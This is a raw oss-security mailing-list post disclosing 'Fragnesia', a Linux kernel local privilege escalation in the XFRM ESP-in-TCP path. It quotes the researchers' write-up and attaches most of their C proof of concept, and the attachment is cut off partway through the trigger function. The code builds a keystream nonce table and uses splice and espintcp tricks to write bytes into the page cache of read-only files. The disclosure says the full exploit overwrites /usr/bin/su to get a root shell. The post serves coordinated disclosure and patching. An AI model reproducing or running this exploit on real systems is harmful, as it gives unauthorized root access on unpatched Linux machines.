Received: (qmail 7169 invoked by uid 550); 13 May 2026 15:08:28 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 9274 invoked from network); 13 May 2026 10:59:53 -0000
From: Sam James <sam@gentoo.org>
To: oss-security@lists.openwall.com
Organization: Gentoo
User-Agent: mu4e 1.14.1; emacs 31.0.60
Date: Wed, 13 May 2026 11:59:37 +0100
Message-ID: <8733zvfucm.fsf@gentoo.org>
MIME-Version: 1.0
Content-Type: multipart/signed; boundary="==-=-=";
	micalg=pgp-sha512; protocol="application/pgp-signature"
Subject: [oss-security] Linux kernel LPE ("fragnesia", copyfail 3.0)

--==-=-=
Content-Type: multipart/mixed; boundary="=-=-="

--=-=-=
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

v12-security have disclosed "Fragnesia" [0]. Quoting their disclosure:
> Fragnesia is a universal Linux local privilege escalation exploit,
> discovered by William Bowling with the V12 team. Fragnesia is a member
> of the Dirty Frag vulnerability class. This is a separate bug in the
> ESP/XFRM from dirtyfrag which has received its own patch. However, it
> is in the same surface and the mitigation is the same as for dirtyfrag.
>
> It abuses a logic bug in the Linux XFRM ESP-in-TCP subsystem to
> achieve arbitrary byte writes into the kernel page cache of read-only
> files, without requiring any race condition.

> The technique extends the page-cache write bug class that includes
> Dirty Pipe: when a TCP socket transitions to espintcp ULP mode after
> data has already been spliced from a file into the receive queue, the
> kernel processes the queued file pages as ESP ciphertext. The AES-GCM
> keystream byte at counter block position 2, byte 0 is XORed directly
> into the cached file page. By selecting the IV nonce to produce a
> desired keystream byte, any target byte in the file can be set to any
> value =E2=80=94 one byte per trigger invocation.
>
> The exploit builds a 256-entry lookup table mapping each possible
> keystream byte to its corresponding nonce, then iterates over a
> payload, firing the splice/ULP race for each byte that needs changing.
> It writes a small position-independent ELF stub
> (setresuid/setresgid/execve /bin/sh) over the first 192 bytes of
> /usr/bin/su in the page cache, then calls execve("/usr/bin/su") to
> obtain a root shell. The page cache modification is not backed to
> disk; the on-disk binary is untouched.

page cache part being copyfail again [0], but the actual bug is more
like dirtyfrag [2]. They've also provided a PoC [3] (attached).

There's a patch on netdev [4], not yet in that tree or in Linus's tree,
therefore not in any stable kernels either.

[0] https://github.com/v12-security/pocs/tree/main/fragnesia
[1] https://www.openwall.com/lists/oss-security/2026/04/29/23 (CVE-2026-314=
31)
[2] https://www.openwall.com/lists/oss-security/2026/05/07/8 (CVE-2026-4328=
4, CVE-2026-43500)
[3] https://github.com/v12-security/pocs/blob/d4043edc2acbd75d093e3f5795751=
b678c66b259/fragnesia/fragnesia.c
[4] https://lore.kernel.org/netdev/20260513041635.1289541-1-vakzz@zellic.io/


--=-=-=
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename=fragnesia.c
Content-Transfer-Encoding: quoted-printable

// Fragnesia: universal Linux LPE
// Ubuntu users: AppArmor interferes with using namespaces, you need to use
// `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=3D0`.
//
// You can chain other bugs to bypass this requirement but this is out of s=
cope for this vulnerability.
//
// Found with V12 by William Bowling on the V12 team
// V12 - https://v12.sh - dangerously powerful agentic security

// Patch: https://lists.openwall.net/netdev/2026/05/13/79

/*
 * Slim ESP-in-TCP/TCP-coalesce page-cache replacement PoC.
 *
 * It only targets an already prepared disposable regular file under /tmp or
 * /var/tmp.  The file must be readable by the caller and should be non-wri=
table
 * to demonstrate the permission boundary.
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -static xfrm_espintcp_pagecache_replace.c -o xfr=
m_espintcp_pagecache_replace
 *
 * Run:
 *   ./xfrm_espintcp_pagecache_replace /tmp/root-owned-copy 0 42434445
 *
 * Exit codes:
 *   1: vulnerable behavior verified
 *   0: fixed/no mutation observed
 *   2: local setup or argument error
 *   4: namespace/XFRM gate closed
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#if __has_include(<linux/if_alg.h>)
#include <linux/if_alg.h>
#else
#include <linux/types.h>
struct sockaddr_alg {
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};
#endif
#include <linux/netlink.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef NETLINK_XFRM
#define NETLINK_XFRM 6
#endif

#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define FRAG_LEN 4096
#define ESP_GCM_ICV_LEN 16
#define ESP_GCM_ENCRYPTED_LEN (FRAG_LEN - ESP_GCM_ICV_LEN)
#define TCP_PORT 5556

#define PAYLOAD_LEN         192
#define FRAME_PAYLOAD_ROWS  12      /* ceil(PAYLOAD_LEN / 16) */
#define FRAME_BAR_W         50
#define FRAME_LINES         15      /* 1 header + 12 hex + 1 bar + 1 sep */

#define RECEIVER_PRE_ULP_US 30000
#define SENDER_PRE_SPLICE_US 1000
#define RECEIVER_POST_ULP_US 30000

static const unsigned char xfrm_aead_key[20] =3D {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

static unsigned char active_esp_gcm_iv[8] =3D {
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
static uint32_t active_esp_seq =3D 1;
static const char *target_file;
static char target_file_buf[PATH_MAX];
static loff_t target_splice_off;

static uint16_t stream0_nonce[256];
static bool stream0_have[256];

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(2);
}

static void gate_fail(const char *what)
{
	printf("namespace_gate_failed: %s errno=3D%d (%s)\n",
	       what, errno, strerror(errno));
	exit(4);
}

static void store_be32(unsigned char *p, uint32_t v)
{
	p[0] =3D (unsigned char)(v >> 24);
	p[1] =3D (unsigned char)(v >> 16);
	p[2] =3D (unsigned char)(v >> 8);
	p[3] =3D (unsigned char)v;
}

/* ANSI colours */
#define C_RESET  "\033[0m"
#define C_BOLD   "\033[1m"
#define C_DIM    "\033[2m"
#define C_RED    "\033[31m"
#define C_GREEN  "\033[32m"
#define C_YELLOW "\033[33m"
#define C_CYAN   "\033[36m"
#define C_WHITE  "\033[97m"
#define C_BRED   "\033[1;31m"
#define C_BGRN   "\033[1;32m"
#define C_BYLW   "\033[1;33m"
#define C_BCYN   "\033[1;36m"
#define C_BWHT   "\033[1;97m"

static void print_hex_bytes(const char *label, const unsigned char *buf,
			    size_t len)
{
	size_t i;

	printf(C_DIM "%s=3D" C_RESET C_CYAN, label);
	for (i =3D 0; i < len; i++)
		printf("%02x", buf[i]);
	printf(C_RESET "\n");
}

/* Dump a 16-byte aligned row centred on `highlight_off`, marking that byte=
. */
static void print_hex_row(const char *path, uint64_t highlight_off,
			  const char *before_label, unsigned char before_val,
			  const char *after_label,  unsigned char after_val)
{
	uint64_t row_start =3D highlight_off & ~(uint64_t)15;
	unsigned char row[16];
	ssize_t got;
	size_t col;
	int fd;

	fd =3D open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	got =3D pread(fd, row, sizeof(row), (off_t)row_start);
	close(fd);
	if (got <=3D 0)
		return;

	/* Hex section */
	printf(C_DIM "  %016llx  " C_RESET, (unsigned long long)row_start);
	for (col =3D 0; col < 16; col++) {
		if (col =3D=3D 8)
			printf(" ");
		if ((size_t)got > col) {
			if (row_start + col =3D=3D highlight_off)
				printf(C_BRED "[%02x]" C_RESET, row[col]);
			else
				printf(C_DIM "%02x " C_RESET, row[col]);
		} else {
			printf(C_DIM "   " C_RESET);
		}
	}

	/* ASCII section */
	printf("  " C_DIM "|" C_RESET);
	for (col =3D 0; col < (size_t)got; col++) {
		unsigned char c =3D row[col];
		if (row_start + col =3D=3D highlight_off)
			printf(C_BRED "%c" C_RESET,
			       (c >=3D 0x20 && c < 0x7f) ? c : '.');
		else
			printf(C_DIM "%c" C_RESET,
			       (c >=3D 0x20 && c < 0x7f) ? c : '.');
	}
	printf(C_DIM "|" C_RESET "\n");

	/* Annotation line */
	size_t col_off =3D (size_t)(highlight_off - row_start);
	size_t arrow_pos =3D 20 + col_off * 3 + (col_off >=3D 8 ? 1 : 0) + 1;
	printf("%*s" C_BYLW "^-- +%04llx  "
	       C_RED "%s" C_RESET ":" C_BRED "%02x" C_RESET
	       "  ->  "
	       C_GREEN "%s" C_RESET ":" C_BGRN "%02x" C_RESET "\n",
	       (int)arrow_pos, "",
	       (unsigned long long)(highlight_off & 0xffff),
	       before_label, before_val,
	       after_label, after_val);
}

static int open_afalg_aes_ecb(void)
{
	struct sockaddr_alg sa =3D {
		.salg_family =3D AF_ALG,
	};
	int fd;

	fd =3D socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("socket(AF_ALG)");

	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "ecb(aes)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind AF_ALG ecb(aes)");
	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_aead_key, 16) < 0)
		die("setsockopt AF_ALG key");

	return fd;
}

static void afalg_aes_encrypt_block(int alg_fd, const unsigned char in[16],
				    unsigned char out[16])
{
	char cbuf[CMSG_SPACE(sizeof(uint32_t))] =3D {};
	struct iovec iov =3D {
		.iov_base =3D (void *)in,
		.iov_len =3D 16,
	};
	struct msghdr msg =3D {
		.msg_iov =3D &iov,
		.msg_iovlen =3D 1,
		.msg_control =3D cbuf,
		.msg_controllen =3D sizeof(cbuf),
	};
	struct cmsghdr *cmsg;
	uint32_t op =3D ALG_OP_ENCRYPT;
	ssize_t ret;
	int op_fd;

	op_fd =3D accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
	if (op_fd < 0)
		die("accept AF_ALG");

	cmsg =3D CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level =3D SOL_ALG;
	cmsg->cmsg_type =3D ALG_SET_OP;
	cmsg->cmsg_len =3D CMSG_LEN(sizeof(op));
	memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

	ret =3D sendmsg(op_fd, &msg, 0);
	if (ret !=3D 16)
		die("sendmsg AF_ALG block");
	ret =3D read(op_fd, out, 16);
	if (ret !=3D 16)
		die("read AF_ALG block");

	close(op_fd);
}

static unsigned char aes_gcm_stream0_byte(int alg_fd,
					  const unsigned char iv[8])
{
	unsigned char counter_block[16], stream[16];

	memcpy(counter_block, &xfrm_aead_key[16], 4);
	memcpy(counter_block + 4, iv, 8);
	store_be32(counter_block + 12, 2);
	afalg_aes_encrypt_block(alg_fd, counter_block, stream);
	return stream[0];
}

static void build_stream0_table(void)
{
	unsigned char iv[8] =3D {
		0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
	};
	unsigned int count =3D 0, nonce;
	int alg_fd;

	alg_fd =3D open_afalg_aes_ecb();
	for (nonce =3D 0; nonce <=3D 0xffff && count < 256; nonce++) {
		unsigned char b;

		store_be32(iv + 4, nonce);
		b =3D aes_gcm_stream0_byte(alg_fd, iv);
		if (stream0_have[b])
			continue;
		stream0_have[b] =3D true;
		stream0_nonce[b] =3D (uint16_t)nonce;
		count++;
	}
	close(alg_fd);

	if (count !=3D 256) {
		fprintf(stderr, "failed to build complete stream-byte table: %u/256\n",
			count);
		exit(2);
	}
	printf("stream0_table_entries=3D256\n");
}

static void choose_iv_for_stream0(unsigned char need_stream)
{
	uint16_t nonce =3D stream0_nonce[need_stream];

	memset(active_esp_gcm_iv, 0xcc, sizeof(active_esp_gcm_iv));
	store_be32(active_esp_gcm_iv + 4, nonce);
	printf("byte_flip_nonce=3D%u stream_byte=3D%02x\n", nonce, need_stream);
	print_hex_bytes("byte_flip_packet_iv", active_esp_gcm_iv,
			sizeof(active_esp_gcm_iv));
}

static uint64_t parse_u64_arg(const char *s, const char *name)
{
	char *end =3D NULL;
	unsigned long long v;

	if (s[0] =3D=3D '-') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	errno =3D 0;
	v =3D strtoull(s, &end, 0);
	if (errno || !end || *end !=3D '\0') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	return (uint64_t)v;
}

static int hex_nibble(int c)
{
	if (c >=3D '0' && c <=3D '9')
		return c - '0';
	if (c >=3D 'a' && c <=3D 'f')
		return 10 + c - 'a';
	if (c >=3D 'A' && c <=3D 'F')
		return 10 + c - 'A';
	return -1;
}

static bool is_hex_separator(int c)
{
	return c =3D=3D ':' || c =3D=3D ',' || c =3D=3D '-' || c =3D=3D '_' ||
	       c =3D=3D ' ' || c =3D=3D '\t' || c =3D=3D '\n' || c =3D=3D '\r';
}

static unsigned char *parse_hex_bytes_arg(const char *s, size_t *len_out)
{
	size_t cap =3D strlen(s) / 2 + 1, len =3D 0;
	unsigned char *buf;
	int hi =3D -1, v;

	buf =3D malloc(cap);
	if (!buf)
		die("malloc desired bytes");

	for (; *s; s++) {
		if (is_hex_separator((unsigned char)*s))
			continue;
		if (hi < 0 && s[0] =3D=3D '0' && (s[1] =3D=3D 'x' || s[1] =3D=3D 'X')) {
			s++;
			continue;
		}

		v =3D hex_nibble((unsigned char)*s);
		if (v < 0) {
			fprintf(stderr, "invalid hex byte string near '%c'\n", *s);
			exit(2);
		}
		if (hi < 0) {
			hi =3D v;
			continue;
		}
		buf[len++] =3D (unsigned char)((hi << 4) | v);
		hi =3D -1;
	}

	if (hi >=3D 0) {
		fprintf(stderr, "hex byte string has an odd number of nibbles\n");
		exit(2);
	}
	if (len =3D=3D 0) {
		fprintf(stderr, "hex byte string is empty\n");
		exit(2);
	}

	*len_out =3D len;
	return buf;
}

static unsigned char read_byte_at(const char *path, uint64_t off)
{
	unsigned char b;
	ssize_t ret;
	int fd;

	fd =3D open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open read byte");
	ret =3D pread(fd, &b, 1, (off_t)off);
	if (ret < 0)
		die("pread byte");
	if (ret !=3D 1) {
		fprintf(stderr, "short pread at offset=3D%llu\n",
			(unsigned long long)off);
		exit(2);
	}
	close(fd);
	return b;
}

static void print_file_sample(const char *label, uint64_t off, size_t len)
{
	unsigned char buf[32];
	ssize_t ret;
	int fd;

	if (len > sizeof(buf))
		len =3D sizeof(buf);
	fd =3D open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open sample");
	ret =3D pread(fd, buf, len, (off_t)off);
	if (ret < 0)
		die("pread sample");
	close(fd);
	if ((size_t)ret !=3D len) {
		fprintf(stderr, "short sample at offset=3D%llu len=3D%zu got=3D%zd\n",
			(unsigned long long)off, len, ret);
		exit(2);
	}
	print_hex_bytes(label, buf, len);
}

static uint64_t use_existing_target(const char *path)
{
	struct stat lst, st;

	if (lstat(path, &lst) < 0)
		die("lstat target");
	if (!S_ISREG(lst.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (stat(path, &st) < 0)
		die("stat target");
	if (!S_ISREG(st.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (st.st_size < FRAG_LEN) {
		fprintf(stderr, "target is too small: size=3D%lld need>=3D%d\n",
			(long long)st.st_size, FRAG_LEN);
		exit(2);
	}
	if (snprintf(target_file_buf, sizeof(target_file_buf), "%s", path) >=3D
	    (int)sizeof(target_file_buf)) {
		fprintf(stderr, "target path is too long\n");
		exit(2);
	}

	target_file =3D target_file_buf;
	return (uint64_t)st.st_size;
}

static void verify_write_denied(const char *label)
{
	int fd;

	errno =3D 0;
	fd =3D open(target_file, O_WRONLY | O_CLOEXEC);
	if (fd >=3D 0) {
		close(fd);
		printf("namespace_gate_failed: %s write-open unexpectedly succeeded\n",
		       label);
		exit(4);
	}

	printf("%s_write_open_denied=3D1 errno=3D%d (%s)\n",
	       label, errno, strerror(errno));
}

static int write_all_file_status(const char *path, const char *buf)
{
	size_t len =3D strlen(buf);
	int fd, saved_errno;

	fd =3D open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	if (write(fd, buf, len) !=3D (ssize_t)len) {
		saved_errno =3D errno;
		close(fd);
		errno =3D saved_errno;
		return -1;
	}
	close(fd);
	return 0;
}

static void sync_write_byte(int fd)
{
	char c =3D 'M';

	if (write(fd, &c, 1) !=3D 1)
		die("sync write");
	close(fd);
}

static void sync_read_byte(int fd)
{
	char c;

	if (read(fd, &c, 1) !=3D 1)
		die("sync read");
	close(fd);
}

static void parent_map_write_or_exit(pid_t child, const char *name,
				     const char *data)
{
	char path[128];

	snprintf(path, sizeof(path), "/proc/%ld/%s", (long)child, name);
	if (write_all_file_status(path, data) < 0) {
		printf("namespace_gate_failed: %s errno=3D%d (%s)\n",
		       path, errno, strerror(errno));
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		exit(4);
	}
}

static void enter_mapped_userns(void)
{
	uid_t outer_uid =3D getuid();
	gid_t outer_gid =3D getgid();
	int ready_pipe[2], mapped_pipe[2], status;
	char map[128];
	pid_t child;

	if (pipe(ready_pipe) < 0)
		die("pipe ready");
	if (pipe(mapped_pipe) < 0)
		die("pipe mapped");

	child =3D fork();
	if (child < 0)
		die("fork userns mapper");

	if (child > 0) {
		close(ready_pipe[1]);
		close(mapped_pipe[0]);

		sync_read_byte(ready_pipe[0]);

		snprintf(map, sizeof(map), "0 %u 1\n", outer_uid);
		parent_map_write_or_exit(child, "uid_map", map);
		parent_map_write_or_exit(child, "setgroups", "deny\n");
		snprintf(map, sizeof(map), "0 %u 1\n", outer_gid);
		parent_map_write_or_exit(child, "gid_map", map);

		sync_write_byte(mapped_pipe[1]);

		if (waitpid(child, &status, 0) < 0)
			die("wait userns child");
		if (WIFEXITED(status))
			exit(WEXITSTATUS(status));
		if (WIFSIGNALED(status)) {
			fprintf(stderr, "userns child killed by signal %d\n",
				WTERMSIG(status));
			exit(2);
		}
		exit(2);
	}

	close(ready_pipe[0]);
	close(mapped_pipe[1]);

	if (unshare(CLONE_NEWUSER) < 0)
		gate_fail("unshare(CLONE_NEWUSER)");

	sync_write_byte(ready_pipe[1]);
	sync_read_byte(mapped_pipe[0]);

	if (setresgid(0, 0, 0) < 0)
		gate_fail("setresgid 0 in userns");
	if (setresuid(0, 0, 0) < 0)
		gate_fail("setresuid 0 in userns");

	printf("userns_setup: outer_uid=3D%u outer_gid=3D%u ns_uid=3D%d ns_gid=3D%=
d\n",
	       outer_uid, outer_gid, getuid(), getgid());
}

static void bring_loopback_up(void)
{
	struct ifreq ifr;
	int fd;

	fd =3D socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		gate_fail("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		gate_fail("SIOCGIFFLAGS lo");
	ifr.ifr_flags |=3D IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		gate_fail("SIOCSIFFLAGS lo up");
	close(fd);

	printf("loopback_up=3D1\n");
}

static void add_nlattr(struct nlmsghdr *nlh, size_t maxlen,
		       unsigned short type, const void *data, size_t len)
{
	size_t off =3D NLMSG_ALIGN(nlh->nlmsg_len);
	struct nlattr *nla;

	if (off + NLA_HDRLEN + len > maxlen) {
		fprintf(stderr, "netlink message too small\n");
		exit(2);
	}

	nla =3D (struct nlattr *)((char *)nlh + off);
	nla->nla_type =3D type;
	nla->nla_len =3D NLA_HDRLEN + len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	nlh->nlmsg_len =3D off + NLA_ALIGN(nla->nla_len);
}

static int nl_ack_errno(char *buf, ssize_t len)
{
	struct nlmsghdr *nlh;
	struct nlmsgerr *err;

	for (nlh =3D (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
	     nlh =3D NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_type !=3D NLMSG_ERROR)
			continue;
		err =3D (struct nlmsgerr *)NLMSG_DATA(nlh);
		if (err->error =3D=3D 0)
			return 0;
		errno =3D -err->error;
		return -1;
	}

	errno =3D EPROTO;
	return -1;
}

static void add_xfrm_espintcp_state(void)
{
	char reqbuf[4096], resp[4096];
	char aeadbuf[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_aead_key)];
	struct sockaddr_nl sa =3D {
		.nl_family =3D AF_NETLINK,
	};
	struct xfrm_usersa_info *xs;
	struct xfrm_algo_aead *aead;
	struct xfrm_encap_tmpl encap;
	struct nlmsghdr *nlh;
	ssize_t ret;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh =3D (struct nlmsghdr *)reqbuf;
	nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(*xs));
	nlh->nlmsg_type =3D XFRM_MSG_NEWSA;
	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq =3D 1;

	xs =3D (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, "::1", &xs->saddr.in6) !=3D 1)
		die("inet_pton saddr");
	if (inet_pton(AF_INET6, "::1", &xs->id.daddr.in6) !=3D 1)
		die("inet_pton daddr");
	xs->id.spi =3D htonl(0x100);
	xs->id.proto =3D IPPROTO_ESP;
	xs->family =3D AF_INET6;
	xs->mode =3D XFRM_MODE_TRANSPORT;
	xs->reqid =3D 1;
	xs->lft.soft_byte_limit =3D XFRM_INF;
	xs->lft.hard_byte_limit =3D XFRM_INF;
	xs->lft.soft_packet_limit =3D XFRM_INF;
	xs->lft.hard_packet_limit =3D XFRM_INF;

	memset(aeadbuf, 0, sizeof(aeadbuf));
	aead =3D (struct xfrm_algo_aead *)aeadbuf;
	snprintf(aead->alg_name, sizeof(aead->alg_name), "rfc4106(gcm(aes))");
	aead->alg_key_len =3D sizeof(xfrm_aead_key) * 8;
	aead->alg_icv_len =3D 128;
	memcpy(aead->alg_key, xfrm_aead_key, sizeof(xfrm_aead_key));
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ALG_AEAD, aeadbuf, sizeof(aeadbuf));

	memset(&encap, 0, sizeof(encap));
	encap.encap_type =3D TCP_ENCAP_ESPINTCP;
	encap.encap_sport =3D htons(TCP_PORT);
	encap.encap_dport =3D htons(TCP_PORT);
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ENCAP, &encap, sizeof(encap));

	fd =3D socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		gate_fail("socket(NETLINK_XFRM)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		gate_fail("bind(NETLINK_XFRM)");

	memset(&sa, 0, sizeof(sa));
	sa.nl_family =3D AF_NETLINK;
	ret =3D sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa,
		     sizeof(sa));
	if (ret < 0)
		gate_fail("sendto XFRM_MSG_NEWSA");
	if (ret !=3D (ssize_t)nlh->nlmsg_len) {
		errno =3D EIO;
		gate_fail("short sendto XFRM_MSG_NEWSA");
	}

	ret =3D recv(fd, resp, sizeof(resp), 0);
	if (ret < 0)
		gate_fail("recv XFRM ack");
	if (nl_ack_errno(resp, ret) < 0)
		gate_fail("XFRM_MSG_NEWSA ack");
	close(fd);

	printf("xfrm_espintcp_state_add=3D1\n");
}

static void setup_user_netns_xfrm(void)
{
	if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) < 0)
		die("prctl PR_SET_DUMPABLE");
	enter_mapped_userns();

	if (unshare(CLONE_NEWNET) < 0)
		gate_fail("unshare(CLONE_NEWNET)");

	printf("netns_setup=3D1\n");
	bring_loopback_up();
	add_xfrm_espintcp_state();
	printf("namespace_setup_complete=3D1\n");
}

static void write_ready(int fd)
{
	char c =3D 'R';

	if (write(fd, &c, 1) !=3D 1)
		die("ready write");
	close(fd);
}

static void wait_ready(int fd)
{
	char c;

	if (read(fd, &c, 1) !=3D 1)
		die("ready read");
	close(fd);
}

static void receiver(int ready_write_fd)
{
	struct sockaddr_in6 addr =3D {
		.sin6_family =3D AF_INET6,
		.sin6_addr =3D IN6ADDR_LOOPBACK_INIT,
		.sin6_port =3D htons(TCP_PORT),
		.sin6_flowinfo =3D 0,
		.sin6_scope_id =3D 0,
	};
	char ulp[] =3D "espintcp";
	int fd, cfd, one =3D 1;

	fd =3D socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("receiver socket");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("receiver reuseaddr");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("receiver bind");
	if (listen(fd, 1) < 0)
		die("receiver listen");

	write_ready(ready_write_fd);

	cfd =3D accept4(fd, NULL, NULL, SOCK_CLOEXEC);
	if (cfd < 0)
		die("receiver accept");

	usleep(RECEIVER_PRE_ULP_US);
	if (setsockopt(cfd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("receiver TCP_ULP espintcp");

	printf("receiver_ns_uid=3D%d euid=3D%d espintcp_enabled_after_queue=3D1\n",
	       getuid(), geteuid());
	usleep(RECEIVER_POST_ULP_US);
	close(cfd);
	close(fd);
	_exit(0);
}

static void sender(int ready_read_fd)
{
	struct sockaddr_in6 dst =3D {
		.sin6_family =3D AF_INET6,
		.sin6_addr =3D IN6ADDR_LOOPBACK_INIT,
		.sin6_port =3D htons(TCP_PORT),
		.sin6_flowinfo =3D 0,
		.sin6_scope_id =3D 0,
	};
	struct {
		__be16 len;
		unsigned char esp[16];
	} prefix;
	loff_t off, start_off;
	int fd, sock, p[2], one =3D 1;
	ssize_t ret, sent;

	wait_ready(ready_read_fd);

	memset(&prefix, 0xcc, sizeof(prefix));
	prefix.len =3D htons(sizeof(prefix) + FRAG_LEN);
	prefix.esp[0] =3D 0x00;
	prefix.esp[1] =3D 0x00;
	prefix.esp[2] =3D 0x01;
	prefix.esp[3] =3D 0x00;
	store_be32(&prefix.esp[4], active_esp_seq);
	memcpy(&prefix.esp[8], active_esp_gcm_iv, sizeof(active_esp_gcm_iv));

	fd =3D open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("sender open target");
	sock =3D socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (sock < 0)
		die("sender socket");
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0)
		die("sender TCP_NODELAY");
	if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect");

	sent =3D send(sock, &prefix, sizeof(prefix), 0);
	if (sent !=3D (ssize_t)sizeof(prefix))
		die("sender send prefix");

	usleep(SENDER_PRE_SPLICE_US);

	if (pipe(p) < 0)
		die("sender pipe");
	off =3D target_splice_off;
	start_off =3D off;
	ret =3D splice(fd, &off, p[1], NULL, FRAG_LEN, 0);
	if (ret !=3D FRAG_LEN)
		die("sender splice file to pipe");

	ret =3D splice(p[0], NULL, sock, NULL, FRAG_LEN, 0);
	if (ret < 0)
		die("sender splice pipe to tcp");

	printf("sender_ns_uid=3D%d euid=3D%d prefix_send=3D%zd splice_to_tcp=3D%zd=
 file_off=3D%lld file_off_next=3D%lld\n",
	       getuid(), geteuid(), sent, ret, (long long)start_off,
	       (long long)off);

	close(p[0]);
	close(p[1]);
	close(sock);
	close(fd);
	_exit(ret =3D=3D FRAG_LEN ? 0 : 3);
}

static int run_trigger_pair(void)
{
	int pipefd[2], st_rx, st_tx;
	pid_t rx, tx;

	if (pipe(pipefd) < 0)
		die("pipe");

	rx =3D fork();
	if (rx < 0)
		die("fork receiver");
	if (rx =3D=3D 0) {
		close(pipefd[0]);
		receiver(pipefd[1]);
	}

	tx =3D fork();
	if (tx < 0)
		die("fork sender");
	if (tx =3D=3D 0) {
		close(pipefd[1]);
		sender(pipefd[0]);
	}

	close(pipefd[0]);
